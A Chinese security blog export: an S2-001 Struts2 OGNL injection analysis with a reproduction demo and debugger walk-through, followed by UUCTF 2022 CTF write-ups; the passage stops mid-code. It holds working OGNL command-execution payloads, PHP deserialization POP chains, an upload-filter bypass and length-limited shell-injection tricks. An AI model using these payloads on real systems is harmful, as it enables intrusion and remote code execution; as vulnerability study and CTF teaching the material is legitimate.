首先在idea安装Struts2插件（官方说2023.2之后就不在支持该插件，这里我是2023.1版本） 这里在搭建环境也是遇到众多问题，因为现在的文章都是几年前的，idea也是老版本，对于我这个idea玩不明白的人，也是很费劲，搜了众多文章总算是解决了。 首先如上图所示创建一个新项目即可，新版不能直接创建Java ee，接着创建好的项目，添加技术框架支持 红色方框这里应该是有个web应用程序的（我这里已经添加过，因此不显示）接着选中Struts2，设置稍后设置库 下载struts-2.0.1-all，在项目目录 WEB-INF 下新建 lib 文件夹，将所需要的jar包从下载目录中导入到 lib 文件夹下，将全部jar包选中，右键 Add as Library 所需要的jar包如上图所示，下面的由于已经创建过，就借用个图 选中以上jar包，添加为库即可，名字任意。接着在项目结构的工件处，将该项目至于Output Root 最后创建Tomcat server（版本在8左右即可），设置好之后，在部署那一栏添加相应的war（可能不够详细，之后会放参考文章） 最后点击右上角的启动即可，成功的话会直接跳转到相应url，但如果显示不成功，除了程序本身的配置问题。看一下是否是使用了https协议，这里我们默认是http，因此你需要修改为http协议 最后项目结构以及成功结果如下图所示 因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。 在 WEB 目录下修改 index.jsp &lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt; &lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %&gt; &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;S2-001&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt;S2-001 Demo&lt;/h2&gt; &lt;p&gt;link: &lt;a href=\"https://cwiki.apache.org/confluence/display/WW/S2-001\"&gt;https://cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt; &lt;s:form action=\"login\"&gt; &lt;s:textfield name=\"username\" label=\"username\" /&gt; &lt;s:textfield name=\"password\" label=\"password\" /&gt; &lt;s:submit&gt;&lt;/s:submit&gt; &lt;/s:form&gt; &lt;/body&gt; &lt;/html&gt; 然后新建welcome.jsp &lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt; &lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %&gt; &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;S2-001&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Hello &lt;s:property value=\"username\"&gt;&lt;/s:property&gt;&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 在 src 下新建 org.example package package org.example; import com.opensymphony.xwork2.ActionSupport; public class LoginAction extends ActionSupport { private String username = null; private String password = null; public String getUsername() { return this.username; } public String getPassword() { return this.password; } public void setUsername(String username) { this.username = username; } public void setPassword(String password) { this.password = password; } public String execute() throws Exception { if ((this.username.isEmpty()) || (this.password.isEmpty())) { return \"error\"; } if ((this.username.equalsIgnoreCase(\"admin\")) &amp;&amp; (this.password.equals(\"admin\"))) { return \"success\"; } return \"error\"; } } 修改Struts.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN\" \"http://struts.apache.org/dtds/struts-2.0.dtd\"&gt; &lt;struts&gt; &lt;package name=\"S2-001\" extends=\"struts-default\"&gt; &lt;action name=\"login\" class=\"org.example.LoginAction\"&gt; &lt;result name=\"success\"&gt;welcome.jsp&lt;/result&gt; &lt;result name=\"error\"&gt;index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;/struts&gt; 之后刷新运行，成功的话会出现登录demo 漏洞复现 获取Tomcat路径 %{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"} 这里bp或者查看源码才能看到回显的路径（或者登录框） 获取web目录 %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()} 执行命令 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} 漏洞分析 上面的漏洞复现有个特性就是，如果我们输入错的内容在输入框，那会保留错误的信息，如下图 发现错误的时候，输入的内容没有被清空，接下来输%{1+1}，如下图，发现被解析成2 从而利用这一特性，可以构造一些命令执行语句。 该漏洞是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL 表达式 % {value} 进行解析，然后重新填充到对应的表单数据中。 我们在OGNL表达式原生API getValue 处下断点，该方法用于解析OGNL表达式并返回表达式的值。 在输入框中输入payload之后，不断步出知道size=2，此时的调用栈就是漏洞发生的整个过程 下面我们就来逐步分析一下： 首先，判断%{1+1}是在何时被执行的，我们将断点设置在 LoginAction 的 setPassword 和 getPassword 方法上 然后，根据最开始的struts工作流程图可以知道在一个http请求进来后，会经过一系列的 拦截器 (Interceptor) ，这些拦截器可以是 Struts2 自带的，也可以是用户自定义的。例如 struts.xml文件中的 package 继承自 struts-default ，而 struts-default 就使用了 Struts2 自带的拦截器。 在 struts2-core-2.0.1.jar/struts-default.xml 中可以找到默认使用的拦截器栈 defaultStack 在拦截器栈defaultStack中， 我们需要关注params这个拦截器。其中， params拦截器会将客户端请求数据设置到 值栈(valueStack) 中，后续 JSP 页面中所有的动态数据都将从值栈中取出。 该拦截器对应的权限定类名是 com.opensymphony.xwork2.interceptor.ParametersInterceptor，该拦截器会通过调用对应 Action 的 setter 方法来为其属性进行赋值；最后，对赋值进行判断，如果 password 的值为“%{1+1}”，则证明代码执行的行为发生在执行 Action 之后；如果 password 的值为 2，则证明代码执行的行为发生在 Action 执行之前。通过这种简单的判断就可以减少漏洞点的搜索范围： 如上图，当我们发送payload，发现复制完成之后。password值仍然是原型%{1+1}，这意味着，代码执行的行为发生在Action之后。意味着截止到执行完 ParametersInterceptor 拦截器为止，没有代码执行的行为发生。 接下来是执行 Action 的 execute 方法，最终结果是返回“error”字符串 根据Struts2整体执行流程。 Action执行完毕后的步骤是操作对应的模板页面，当LoginAction的execute方法返回“error”字符串时， Struts2要去解析的模板页面是index.jsp。 Struts2 支持多种模板引擎(freemarker、jsp、util、velocity、xslt)，jsp 只是其中一种。所以在真正开始解析之前，Struts2 还需要判断开发人员使用的模板引擎种类，从而调用对应的类和方法。 负责处理 JSP 的类是 org.apache.struts2.views.jsp.ComponentTagSupport。解析会从第一个 Struts2 标签即&lt;s:form action=\"Login\"&gt;开始，当解析到 ComponentTagSupport 类时，首先被调用的方法就是 doStartTag 方法，该方法的代码如下图所示。除 doStartTag 方法外，ComponentTagSupport 中 还有一个 doEndTag 方法，一个是解析标签开始时调用，另一个是解析到标签闭合时调用。 问题一 这里看了网上很多文章，可能是我基础不太行，加上众多师傅选择的依赖包版本是struts2-core-2.0.8.jar，而这里我是struts2-core-2.0.1.jar，于是找调试入口点，就找了半天，无从下手。这里也是选择了一种调试的方法（结合多个文章吧） 我们先在自定义的action处下个断点，用来截停分析接受页面传来的数据 点击submit就会发现代码断点处接受到了传来的数据 从这里开始网上的很多文章就直接看调用栈了，说是下图中的DefaultActionInvocation类中反射调用了我们自定义的类 LoginAction。 路径：/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class 但我直接跟进却看不出个所以然，这里我认为有两种办法，一个就是一个个点击调用栈，寻找谁调用了LoginAction这个类方法，或者就是直接F8跟随看一下各个参数的数据，寻找ActionLogin关键字，如下图，可以看到这里的invokeAction顾名思义或者看代码就能知道通过method.invoke调用了我们的自定义Action类 同时也能看到这里的method值是execute方法，也就是执行Action类下的execute方法。 接下来可能就是马后炮了，网上的文章是根据Struts执行流程来分析整条链子（应该是经验丰富导致的思路），而对我这个小白很茫然，但我们不妨先跟着师傅们分析一下，随后看看有什么课后感想。 根据其框架流程图，我们知道，当接受了一个http请求之后，会先经过一系列拦截器的执行，首先就是参考Struts.xml里面的代码，如下图所示，先是继承了一个struts-default这个Struts2自带的默认拦截器，我们找一下相应的文件 根据文章以及上面的分析我们也知道，这里要关注的是params 这个拦截器。其中， params 拦截器 会将客户端请求数据设置到 值栈(valueStack) 中 后续 JSP 页面中所有的动态数据都将从值栈中取出。那这一点我们如何来验证呢，下个断点即可 至于为什么是这个方法，我想是因为函数名称来定位的，这里顾名思义就是参数拦截器，而我们恰好是要找拦截器。并且其中的try代码块也涉及到了栈以及我们自定义Action的出现，我们下一个断点先 如上图可以看到，这里的函数参数中存在着password与username，显然这证明了我们客户端存入的数据被存入了ognl的值栈中。接着我们跟进对应的setParameters函数 while上面的逻辑，先是正常赋个值，ordered值默认就是false，看一下这里的TreeMap，根据GPT回答，这个类就是将传入的Map类对象parameters按照TreeMap对象自身的规则对这些键值对进行排序，然后赋值给params。 接着通过entrySet方法获取params中的全部键值对 这里看一下while的逻辑，通过上面的iterator迭代器调用next获取当前条目，然后强转一下，调用entry的getkey获取当前条目的键，随后通过一条语句给acceptableName赋值，看一下acceptableName逻辑 protected boolean acceptableName(String name) { return name.indexOf(61) == -1 &amp;&amp; name.indexOf(44) == -1 &amp;&amp; name.indexOf(35) == -1 &amp;&amp; name.indexOf(58) == -1; } 根据GPT，这里就是判断name的值是否含有特殊字符： 函数内部使用多个indexOf方法检查字符串name是否包含某些特殊字符（ASCII码值），即=（61）、,（44）、#（35）和:（58）。如果字符串name包含这些特殊字符中的任何一个，则该函数返回false；否则返回true。 具体来说，indexOf方法用于查找指定字符第一次出现在字符串中的位置。如果未找到该字符，则返回-1。这里，我们检查name中是否包含特定字符，如果没有找到，就返回-1，表示不包含该字符，继续执行下一个检查。 因此，这段代码实际上是判断字符串name中是否包含特定字符=、,、#和:，如果字符串中包含这些特殊字符，则返回false，否则返回true。 显然这里我们的name是password，这样的话就能跳出while循环，接着通过getValue得到password的值%{1+1}，最后调用stack的setValue将我们输入的数据放入了值栈（这里可以跟进setValue看一下，大体就能知道个逻辑） 现在我们回顾最开始的分析，可以确定这里在最后压入值栈的时候password的值还未被解析，这意味着这段代码的解析肯定是处于这些拦截器之后的，也就是说漏洞点发生在我们自定义Action执行之后，现在我们就理解了为何上述会去先判断漏洞发生点(不然范围太大了)，那接下来就是分析Action之后的代码了 回到我们自定义的Action，我们知道根据我们传入的数据，这里最后肯定返回的是error字符串，我们看一下Struts.xml对应的处理办法 可以看到转到index.jsp进行处理。我们的payload是从index.jsp输入的，这里需要了解的是jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，比如这里index.jsp被转化为index_jsp.java。 负责处理 JSP 的类是 org.apache.struts2.views.jsp.ComponentTagSupport。解析会从第一个 Struts2 标签即&lt;s:form action=\"Login\"&gt;开始，当解析到 ComponentTagSupport 类时，首先被调用的方法 就是 doStartTag 方法，该方法的代码如下图所示。除 doStartTag 方法外，ComponentTagSupport 中 还有一个 doEndTag 方法，一个是解析标签开始时调用，另一个是解析到标签闭合时调用。 路径： /org/apache/struts2/views/jsp/ComponentTagSupport.class ComponentTagSupport 是一个抽象类。由于首先被解析的是一个 Struts2 Form 标签， org.apache.struts2.views 有一个与 Form标签对应的实体类，类名为 FormTag，是 ComponentTagSupport 的子类。虽然当前断点设置在 ComponentTagSupport 的 doStartTag 方法 上，其实是子类在调用父类方法，因为当前对象是 FormTag 对象： 接下来就是重点分析Form标签后面的&lt;s:textfield标签，这两个标签的具体写法如图 接下来我们别事后诸葛亮，先从doStartTag开始分析 上述的component调用getBean函数，传入的参数为值栈对象、http请求对象、http相应对象，最后会返回一个TextField对象（这里暂时没看出什么可疑点） 下面两幅图片是，getBean中具体的实现代码，也是没有可疑点 this.populateParams();似乎就是单纯的设置属性id 随后调用start函数，不过这里恒为true 接着进入if语句，调用usesBody，依旧恒为false，也就是这个doStartTag始终返回1 接着分析doEndTag，首先跟进函数end，这里继续调用了evaluateParams，继续跟进 这个函数前半部分逻辑清晰，就是添加相应的参数（键：键值） 接着分析下半部分，这里先展示了两个函数，一个返回恒为true，一个返回恒为String.class的类对象 根据上面两个函数，这意味着我们一定会进入第二个if语句，由于value的值为null，因此进入else语句，这里的name就是我们的username字符串 根据下面两个图片，我们知道alSyntax恒为true 这意味着，最终expr的值会是name值周围添加指定符号，构成ognl表达式 接着就是添加属性nameValue，这其中调用了findValue来寻找name也就是username字符串对应的值，跟进去看看 如上图，最终是一定会进入translateVariables方法，传入三个参数，%、expr以及值栈 这里继续调用了重载函数，无他，继续跟进，这里我认为就是关键的点了，分析一下while这里执行逻辑 public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) { Object result = expression; while(true) { int start = expression.indexOf(open + \"{\"); int length = expression.length(); int x = start + 2; int count = 1; while(start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) { char c = expression.charAt(x++); if (c == '{') { ++count; } else if (c == '}') { --count; } } int end = x - 1; if (start == -1 || end == -1 || count != 0) { return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType); } String var = expression.substring(start + 2, end); Object o = stack.findValue(var, asType); if (evaluator != null) { o = evaluator.evaluate(o); } String left = expression.substring(0, start); String right = expression.substring(end + 1); if (o != null) { if (TextUtils.stringSet(left)) { result = left + o; } else { result = o; } if (TextUtils.stringSet(right)) { result = result + right; } expression = left + o + right; } else { result = left + right; expression = left + right; } } } charAt()函数是用于获取字符串中指定索引位置的字符的方法。它属于String类的成员方法，可以通过字符串对象调用。 首先就是定义某些参数，这里代码能看懂，但是不知道具体含义是什么，看了文章发现是用来判断{与}符号数量是否一致，如果一致，那count最终就是0；（估计是为了符合ognl表达式要求 这里最终会由于count=0跳出这个循环，来到下图，这里尝试返回username对应的值，赋值给对象o 这里我还没赋值，我们假设这里username值为%{1+1}，那o的值就不是null，然后这里的stringSet，由于string肯定为null（也就是left），最终的就会造成expression=%{1+1} 接着按照上图，跟进OgnlUtil.getValue，此时发现进入到Ognl.class的getValue，也就是处理Ognl表达式的类 这里利用tree参数（被强转为tree）之后调用getValue方法 之后来到if语句，由于getTraceEvaluations恒为false，于是直接执行最下面的evaluateGetValueBody 如下图，先是设置上下文的当前对象以及当前节点，最终会调用getValueBdoy方法，继续跟进 接着就是ognl表达式的底层逻辑了，这里先不分析ognl表达式漏洞，我们只需要知道在getValueBdoy方法中，先是取出ognl表达式，这里就是%{1+1}得到第一个节点，这里显示result=1，接着进入for循环，继续遍历第二个节点，随后再取出来将得到的结果，调用add函数（逻辑似乎就是相加），相加得到result=2，也就是ognl表达式的解析执行 至此struts2-001漏洞分析也就结束了 问题二 虽然分析了上述struts2-001漏洞，但其实也知道，根本上还是因为ognl表达式的注入漏洞，因此我认为还需要具体分析一下ognl表达式。 借助一个demo，下断点跟进getValue 往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型： 到达下图，发现tree参数（被强转为Node）调用了getValue，传入的参数为当前ognl上下文以及root根对象，继续跟进 发现调用了evaluateGetValueBody，继续跟进 这里跟进到了getValueBody方法，这里看逻辑是对当前对象所拥有的节点进行的处理，继续跟进发现到了如下图所示的地方，对当前根节点调用getValue 跟进之后，又来到getValueBody（重载方法），跟进发现调用了callStaticMethod 如下图，可以看到这里调用了classForName获得当前className的class对象也就是java.lang.Runtime的类对象 继续跟进调用callStaticMethod重载函数，调用了getMethods来获取当前java.lang.Runtime类对象的getRuntime方法 继续跟进，调用了invokeMethod 最终是调用了invoke方法，执行getRuntime函数来实例化Runtime类 至此第一部分节点分析完成，接下来分析exec方法是如何传入进去的，也就是第二个节点 分析路径基本一样，只是调用的相关重载函数不一致 按照节点一的思路持续跟进，最终来到这里发现调用callMethod方法 进一步调用getMethods 无脑跟进，最终看到再次调用method.invoke，执行了Runtime实例的exec方法，并传入了calc参数，弹出计算器 至此，最终函数调用栈如下 invokeMethod:491, OgnlRuntime (ognl) callAppropriateMethod:785, OgnlRuntime (ognl) callStaticMethod:48, ObjectMethodAccessor (ognl) callStaticMethod:806, OgnlRuntime (ognl) getValueBody:67, ASTStaticMethod (ognl) evaluateGetValueBody:170, SimpleNode (ognl) getValue:210, SimpleNode (ognl) getValueBody:109, ASTChain (ognl) evaluateGetValueBody:170, SimpleNode (ognl) getValue:210, SimpleNode (ognl) getValue:333, Ognl (ognl) getValue:378, Ognl (ognl) getValue:357, Ognl (ognl) main:13, Test (org.example) 简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。 0x05 漏洞修复 这里在分析修复前后的代码又遇到了小小问题，发现对漏洞产生还是有点不清楚，但继续重新调试终于明白 附上修复和修复前的代码（借个图） 可以看到上述增加了一个if判断，根据文章所说，这里是 Ognl 递归解析次数的判断，默认情况下仅解析第一层。 对于这种修复解释，我们先看一下漏洞执行逻辑，首先是解析执行%{username}，是一个ognl表达式，会进行ognl表达式解析执行，最终就是来获取username的值，也就是最终成为%{1+1}，因为我们设置的username就是%{1+1}，由于修复前的代码用的是while循环，因此又会去递归解析这个%{1+1}，又认为是ognl表达式，最终解析为2。 但修复后的进行了判断：递归解析次数。因此如果还是上述情况，会在解析%{1+1}的时候，判断次数上限，退出while循环，也就不会被执行了。 总结 经过上述漏洞的分析，可以看到Struts2-001漏洞点，就在于对用户输入的数据没有做出合理判断，导致在解析ognl表达式的时候，在其中的while循环，递归解析了ognl表达式，导致任意代码执行。 0x06 Poc采集 回显poc %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"pwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} 调试poc： %{(new java.lang.ProcessBuilder(new java.lang.String[]{\"calc.exe\"})).start()} 获取web路径 %{ #req=@org.apache.struts2.ServletActionContext@getRequest(), #response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(), #response.println(#req.getRealPath('/')), #response.flush(), #response.close() } 0x07 参考文章 Java安全之S2-001漏洞分析 OGNL表达式注入漏洞总结 Java Web安全入门——S2-001漏洞分析 Struts2-001漏洞分析（CVE-2007-4556）–环境搭建可参考 OGNL表达式注入漏洞总结 https://github.com/Mochazz/Struts2-Vuln/blob/master/Article/Java代码审计之Struts2-001.md JavaWeb安全入门之 S2-001漏洞分析","tags":["Java反序列化"],"categories":["Java反序列化"]},{"title":"UUCTF_2022","path":"/2024/04/15/uuctf-2022/","content":"[UUCTF 2022 新生赛]websign 源码找到 [UUCTF 2022 新生赛]ez_rce 主要还是对eval有个理解：就是将括号内的字符串当PHP代码执行，并且这里需要借助print_r函数打印结果 ?code=print_r(`ta\\c /fffffffffflagafag`); [UUCTF 2022 新生赛]ez_upload fuzz了一波，过滤了php、.htaccess、.user.ini后缀，尝试了畸形后缀没有用，然后考虑中间件解析漏洞 但是尝试了一波nday无果，看了wp发现跟我理解的解析漏洞不一致：https://www.cnblogs.com/bkofyZ/p/17629763.html 说是 Apache解析漏洞：因为Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）,可用来绕过黑名单过滤。 这个是我们常见的说法，但这里搞得是shell.xxx.php，按理来说应该是shell.php.hybcx，应该是最右侧识别不了，才识别左侧，这里我也不清楚这算哪种解析漏洞 之后蚁剑连接看一下源码 &lt;?php //echo $_FILES['file']['name'];echo '&lt;br&gt;'; //echo $_FILES['file']['type'];echo '&lt;br&gt;'; $flag1=true; $flag2=true; $file_name=$_FILES['file']['name']; $file_type=$_FILES['file']['type']; $allow_file_type=['image/jpeg','image/png']; $allowedExts = array(\"php\", \"php3\", \"php5\", \"phtml\",\"htaccess\"); $ext=substr($file_name,strpos($file_name,\".\")+1); if(!in_array(strtolower($file_type),$allow_file_type)){ $flag1=false; die(\"你好坏哦，不理你了\"); } if(in_array(strtolower($ext),$allowedExts)){ $flag2=false; die(\"你好坏哦，不理你了\"); } if($flag1&amp;&amp;$flag2){ if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo $_FILES[\"file\"][\"name\"] . \" 文件已经存在。 \"; } else { // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下 move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"文件存储在: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; } } else{ echo \"Hacker，你好坏哟\"; } 发现他对于后缀的判断，只是基于第一个点号之后的字符进行检查，对于我们的shell.xxx.php，经过截取之后就是xxx.php，那肯定不在过滤名单中，又由于后缀是php，经过apache解析就以php文件执行了。 很显然这只是业务逻辑问题，与apache解析漏洞也谈不上。 参考文章 [UUCTF 2022 新生赛]ez_upload [UUCTF 2022 新生赛]ez_unser &lt;?php show_source(__FILE__); ###very___so___easy!!!! class test{ public $a; public $b; public $c; public function __construct(){ $this-&gt;a=1; $this-&gt;b=2; $this-&gt;c=3; } public function __wakeup(){ $this-&gt;a=''; } public function __destruct(){ $this-&gt;b=$this-&gt;c; eval($this-&gt;a); } } $a=$_GET['a']; if(!preg_match('/test\":3/i',$a)){ die(\"你输入的不正确！！！搞什么！！\"); } $bbb=unserialize($_GET['a']); 你输入的不正确！！！搞什么！！ 简单的反序列化，虽然这里不能绕过wakeup，但是可以配合引用来绕过 &lt;?php class test{ public $a; public $b; public $c; public function __construct(){ $this-&gt;a=\"system('ls /')\"; $this-&gt;b=&amp;$this-&gt;a; $this-&gt;c=\"system('ls /')\"; } } $pop=new test(); echo serialize($pop); ?&gt; 读取即可 [UUCTF 2022 新生赛]ezsql 简单sql注入，只过滤了or，双写即可，剩下就是反转一下字符串即可 [UUCTF 2022 新生赛]ezpop &lt;?php //flag in flag.php error_reporting(0); class UUCTF{ public $name,$key,$basedata,$ob; function __construct($str){ $this-&gt;name=$str; } function __wakeup(){ if($this-&gt;key===\"UUCTF\"){ $this-&gt;ob=unserialize(base64_decode($this-&gt;basedata)); } else{ die(\"oh!you should learn PHP unserialize String escape!\"); } } } class output{ public $a; function __toString(){ $this-&gt;a-&gt;rce(); } } class nothing{ public $a; public $b; public $t; function __wakeup(){ $this-&gt;a=\"\"; } function __destruct(){ $this-&gt;b=$this-&gt;t; die($this-&gt;a); } } class youwant{ public $cmd; function rce(){ eval($this-&gt;cmd); } } $pdata=$_POST[\"data\"]; if(isset($pdata)) { $data=serialize(new UUCTF($pdata)); $data_replace=str_replace(\"hacker\",\"loveuu!\",$data); unserialize($data_replace); }else{ highlight_file(__FILE__); } ?&gt; 这里链子很简单，但就是$this-&gt;basedata这里的处理，如果尝试直接在代码中构造序列化字符串会发现没有用，因此这里就能想到凭借字符串逃逸来插入basedata的payload 我们先构造一下最终理想的字符串，由于这里输入的内容最终都会赋值给name，因此需要逃逸一下，我们先闭合前面的name值 \";s:3:\"key\";s:5:\"UUCTF\";s:8:\"basedata\";s:'.strlen($basedata).':\"'.$basedata.'\";s:2:\"ob\";N;} 也就是说我们需要知道上述payload的长度，根据长度来构建hacker的个数，pop如下 &lt;?php class UUCTF{ public $name,$key,$basedata,$ob; } class output{ public $a; } class nothing{ public $a; public $b; public $t; } class youwant{ public $cmd; } $pop = new nothing(); $pop-&gt;a = &amp;$pop-&gt;b; $pop-&gt;t = new output(); $pop-&gt;t-&gt;a = new youwant(); $pop-&gt;t-&gt;a-&gt;cmd = \"system('tac flag.php');\"; $pop1 = base64_encode(serialize($pop)); $data = '\";s:3:\"key\";s:5:\"UUCTF\";s:8:\"basedata\";s:'.strlen($pop1).':\"'.$pop1.'\";s:2:\"ob\";N;}'; $payload = ''; $hacker = ''; for ($i = 0; $i &lt; strlen($data);$i++){ $hacker .= 'hacker'; } $payload = $hacker.$data; echo $payload; ?&gt; 这里他们说cat回显不了，我就直接换了。这里成功逃逸之后，后面的payload就不再是name的值了，便会被单独反序列化出来。 这道题当初不会也就是因为没想通为什么要逃逸字符串，对name这个地方没有思考。 [UUCTF 2022 新生赛]ezrce 这道题环境出了点问题，但忽略即可。根据提示这道题是一道无回显RCE，且限制命令执行长度小于7 跟着文章学如何绕过长度限制即可，这里也没有对命令做出限制，学习参考：https://blog.csdn.net/jvkyvly/article/details/115259867 总的来说就是凭借&gt;与&gt;&gt;：也就是覆盖和追加来进行绕过，浅浅举个例子： 比如限制了长度为7（经典的就是7、5、4），假设我们想要执行的命令是：cat /flag显然超过长度限制了，接下来我们这样构造 &gt;g\\\\ &gt;a\\\\ &gt;l\\\\ &gt;f\\\\ &gt;/\\\\ &gt;\\ \\\\ &gt;e\\\\ &gt;r\\\\ &gt;o\\\\ &gt;m\\\\ ls -t&gt;0 如上图所示，当写完上述payload，利用ls -t选项，使得当前目录按照时间顺序由早到晚进行排列，随后利用sh 执行文件0，其中的内容便会被当做命令执行。具体原因如下： 1.linux中可以用\\使指令连接下一行，这样就可以写多行命令了。 2.文件中前面命令出错，会自动跳过，不影响后面命令的执行。 3.可以用sh,bash,source, .来执行一个脚本。 简单来说就是可以用 sh 0 bash 0 ./0 . 0 来执行0这个脚本 而上述构造payload的时候，写了两次\\\\，是为了转义\\，否则会被当做连接下一行来执行，而空格在linux中也会被认为是命令的分隔符，因此也需要\\转义一下 而有了上述的思路，这道题测试了一下，发现长度限制为小于7，而ls -t&gt;0长度恰好为7，显然不行，因此就应该先想办法构造ls -t&gt;0即可，不过针对这道题还可以有其他思路（也是看的wp） 直接先&gt;nl创建一个nl目录，接着输入* /*&gt;d，命令解释如下 1.通配符*:相当于$(dir *), 2.输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数 但这里我在测试的时候，输入*总是会显示命令不存在，也不清楚什么情况 最后执行完之后，访问/tmp/d即可得到flag 参考文章 2022UUCTF-web CTF长度限制命令执行 [UUCTF 2022 新生赛]phonecode 说实话，这题看下来感觉是需要脑洞的，根据标签提示以及问题搜索，我清楚这道题考点就是随机数预测，但该站点的逻辑我并未搞懂，我们借助wp分析吧 不过在此之前，我经过测试发现如下现象，当采用数字作为随机数种子时，得到的结果始终是重复唯一的（不论数字长度多少） 但当采用字符串作为随机数种子的时候，得到的结果总是变化的，具体解释GPT给出如下回答： 当你将字符串用作随机数生成器的 seed 时，即使生成的序列看起来像是随机的，但它仍然是 deterministic（确定性的）。这是因为虽然在字符串和整数之间存在明确的转换规则，但由于字符串的可能取值范围要大得多，因此很难预测字符串到整数的转换结果，从而导致生成的随机数序列也更难以预测。 具体而言，当你使用字符串作为 seed 时，MT 生成算法首先对字符串进行特殊处理，将其转换为一个大型整数。这个过程涉及将字符串中的每个字符映射到一个固定的大素数上，然后将这些数相乘和折叠以形成最终的大整数。这个过程非常复杂，因此很难直接预测字符串到整数的转换关系。 虽然在某些情况下仍然可能出现某些 seed patterns 导致类似的序列，但由于字符串的可能取值范围广泛且复杂，因此在实践中很少遇到这种问题。 总之，使用字符串作为 seed 可以让人感觉生成的随机数序列更加随机，但实际上它仍然是确定性的。建议还是使用无 pattern 的 seed，比如 time-based values 以获得更好的伪随机性。 接下来分析逻辑，可以看到上述的http包中，post传的参含有phone与code参数，给出的响应结果是一个hint:数字，显然hint就是来提示我们的 结合题目信息：你能猜到验证码吗？ 可以猜到，phone大概率是作为了随机数种子，而code应该就是该随机数种子经过mt_rand函数得到的结果（但不清楚是第几个） 那思路明确了，我们设置随机数种子（也就是phone），猜解一下code会是该种子产生的伪随机数的第几个即可 &lt;?php mt_srand(1); echo mt_rand(); echo \" \"; echo mt_rand(); echo \" \"; echo mt_rand(); echo \" \"; ?&gt; 输出 895547922 2141438069 1546885062 这里尝试了第二个随机数，成功猜解 不过值得一提的是，我们在得到随机数结果的时候，并不清楚PHP版本，而版本不同，生成的结果也就不同，这时候就需要利用工具来猜解一下当前PHP版本。如上图，爆破出一个seed=1，对应的版本是php7.1，这意味着我们在自己测试的时候，也需要与其的版本匹配才可以。 参考文章 伪随机数问题总结 PHP伪随机数 UUCTF WP [UUCTF 2022 新生赛]funmd5 &lt;?php error_reporting(0); include \"flag.php\"; $time=time(); $guessmd5=md5($time); $md5=$_GET[\"md5\"]; if(isset($md5)){ $sub=substr($time,-1); $md5=preg_replace('/^(.*)0e(.*)$/','${1}no_science_notation!${2}',$md5); if(preg_match('/0e/',$md5[0])){ $md5[0]=substr($md5[0],$sub); if($md5[0]==md5($md5[0])&amp;&amp;$md5[1]===$guessmd5){ echo \"well!you win again!now flag is yours.&lt;br&gt;\"; echo $flag; } else{ echo $md5[0]; echo \"oh!no!maybe you need learn more PHP!\"; } } else{ echo \"this is your md5:$md5[0]&lt;br&gt;\"; echo \"maybe you need more think think!\"; } } else{ highlight_file(__FILE__); $sub=strlen($md5[0]); echo 